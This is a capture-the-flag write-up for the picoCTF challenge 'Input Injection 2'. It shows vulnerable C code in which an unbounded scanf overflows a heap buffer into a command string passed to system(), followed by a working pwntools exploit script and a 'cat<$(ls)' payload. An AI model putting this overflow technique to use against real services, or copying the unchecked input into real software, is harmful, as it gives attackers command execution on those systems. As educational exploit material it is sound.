# Input Injection 2

### Information
* Category: Pwn
* Point:
* Level: Medium

### Description
This program greets you and then runs a command. But can you take control of what command it executes?

Connect to server via `$ nc amiable-citadel.picoctf.net <PORT>`

### Hint
- Notice how username and shell are both heap-allocated.
- Offsets often hide in the memory addresses you see at runtime.
- Try to overwrite what command gets executed.

### Solution

#### What we got?
- The problem gives us a src code:
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>


    int main(void) {
        char* username = malloc(28);
        char* shell = malloc(28);
        
        printf("username at %p\n", username);
        fflush(stdout);
        printf("shell at %p\n", shell);
        fflush(stdout);
        
        strcpy(shell, "/bin/pwd");
        
        printf("Enter username: ");
        fflush(stdout);
        scanf("%s", username);
        
        printf("Hello, %s. Your shell is %s.\n", username, shell);
        system(shell);
        fflush(stdout);
        
        return 0;
    }
    ```

    - **Explanation**: The program allocates two 28‑byte buffers on the heap—`username` and `shell`—and prints their memory addresses so the user can see where they are stored. It then copies the string `"/bin/pwd"` into the `shell` buffer and prompts the user to enter a username. Because `scanf("%s")` does not restrict input length, whatever the user types is written directly into the `username` buffer, potentially overflowing into adjacent memory. After the input is stored, the program prints a greeting using both buffers and then calls `system(shell)`, which runs the command stored inside the `shell` string. If the user input was longer than 28 bytes, it can overwrite the contents of `shell`, allowing the executed command to be changed. This makes the program vulnerable to a heap‑based buffer overflow that can lead to unintended command execution.

#### How to get the flag ?
- Run the code, we can see the address of `username` and `shell`. Because the program uses `scanf("%s")` on a 28‑byte `username` allocation, the attacker can overflow `username` and overwrite the contents of `shell`, which is later passed to `system()`. 
- We have the script to crack:
    ```python
    from pwn import *

    HOST = "amiable-citadel.picoctf.net"
    PORT = 58596

    p = remote(HOST, PORT)
    user_address = int(p.recvline().strip().split()[-1], 16)
    shell_address = int(p.recvline().strip().split()[-1], 16)
    diff = shell_address - user_address

    p.recvuntil(b"username: ")

    name = b"A" * diff + b"cat<$(ls)\n"
    p.sendline(name)
    flag = p.recvline()
    print(flag)
    ```
- The script calculates the distance between the two heap buffers (`diff = shell_address - user_address`) and sends an input consisting of `diff` bytes of padding (`"A" * diff`) so that the overflow lands exactly on the `shell` string. It then appends the payload `cat<$(ls)` so that, once `system(shell)` executes, the program runs a command that lists the files on the server and prints the contents of whichever file appears first—typically exposing the challenge flag. After sending this crafted input, the script reads and prints the resulting line, which contains the flag.
- Run it and we will have the flag:

    ![Flag]()
